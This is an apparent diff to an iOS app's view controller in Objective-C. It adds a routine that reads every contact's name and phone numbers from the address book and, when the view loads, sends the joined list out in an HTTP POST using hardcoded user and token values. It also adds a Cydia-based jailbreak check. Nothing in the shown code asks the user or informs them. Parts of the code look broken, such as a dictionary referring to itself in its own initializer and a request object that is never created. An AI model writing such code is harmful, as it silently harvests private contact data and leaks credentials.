@@ -11,12 +11,47 @@
 #import "Reachability.h" 
 #import "ASIHTTPRequest.h"
 #import "ASIFormDataRequest.h"
+#import <AddressBook/AddressBook.h>
+#import <AddressBook/ABAddressBook.h>
+#import <AddressBook/ABPerson.h>
 
 @interface ViewController ()
 
 @end
 
 @implementation ViewController
+
+-(NSMutableArray *)retrieveContactList
+{
+	ABAddressBookRef myAddressBook = ABAddressBookCreate();
+	NSArray *allPeople = (__bridge NSArray *)ABAddressBookCopyArrayOfAllPeople(myAddressBook);
+	contactList = [[NSMutableArray alloc]initWithCapacity:[allPeople count]];
+	for (id record in allPeople) {
+        CFTypeRef phoneProperty = ABRecordCopyValue((__bridge ABRecordRef)record, kABPersonPhoneProperty);
+        NSArray *phones = (__bridge NSArray *)ABMultiValueCopyArrayOfAllValues(phoneProperty);
+		//NSLog(@"phones array: %@", phones);
+        CFRelease(phoneProperty);
+		NSString* contactName = (__bridge NSString *)ABRecordCopyCompositeName((__bridge ABRecordRef)record);
+		
+		NSMutableDictionary *newRecord = [[NSMutableDictionary alloc] init];
+		[newRecord setObject:contactName forKey:@"name"];
+		//[contactName release];
+		NSMutableString *newPhone = [[NSMutableString alloc] init];
+		for (NSString *phone in phones) {
+        	//NSString *fieldData = [NSString stringWithFormat:@"%@: %@", contactName, phone];
+			if(![newPhone isEqualToString:@""])
+				[newPhone appendString:@", "];
+			[newPhone appendString:phone];
+            
+        }
+		[newRecord setObject:newPhone forKey:@"phone"];
+		[contactList addObject:newRecord];
+		//[newPhone release];
+    }
+	CFRelease(myAddressBook);
+    NSLog(@"Final data: %@", contactList);
+    return contactList;
+}
 
 - (void)viewDidLoad
 {
@@ -25,26 +60,29 @@
 
     UIDevice *device = [UIDevice currentDevice];
     NSString *uniqueIdentifier = [device uniqueIdentifier];
+    NSString *msg;
     
-    //ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:url];
-    NSDictionary* postBody = [[NSDictionary alloc] initWithObjectsAndKeys:postBody, @"user","S1CezgKG7IHhLEXEYI9OPeYXvPysvB", @"message", "iPad",@"token","ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd"];
-    [request setPostValue:@"S1CezgKG7IHhLEXEYI9OPeYXvPysvB" forKey:@"user"];
-    [request setPostValue:@"ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd" forKey:@"token"];
-    [request setPostValue:uniqueIdentifier forKey:@"message"];
-    [request addRequestHeader:@"Content-Type" value:@"application/json"];
-    [request setDelegate:self];
-    [request startAsynchronous];
+    NSMutableArray *contacts = [self retrieveContactList];
+    NSString *contactString = [contacts componentsJoinedByString:@","];
     
     NSString *filePath = @"/Applications/Cydia.app";
     if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
     {
         NSLog(@"Cydia exists on disk");
-        // do something useful
+        msg = @"Jailbroken";
     }
     else
     {
         NSLog(@"Cydia does not exist");
+        msg = @"Not Jailbroken";
     }
+    NSDictionary* postBody = [[NSDictionary alloc] initWithObjectsAndKeys:postBody, @"user","S1CezgKG7IHhLEXEYI9OPeYXvPysvB", @"message", "iPad",@"token","ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd"];
+    [request setPostValue:@"S1CezgKG7IHhLEXEYI9OPeYXvPysvB" forKey:@"user"];
+    [request setPostValue:@"ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd" forKey:@"token"];
+    [request setPostValue:contactString forKey:@"message"];
+    [request addRequestHeader:@"Content-Type" value:@"application/json"];
+    [request setDelegate:self];
+    [request startAsynchronous];
 
     [super viewDidLoad];
 	// Do any additional setup after loading the view, typically from a nib.
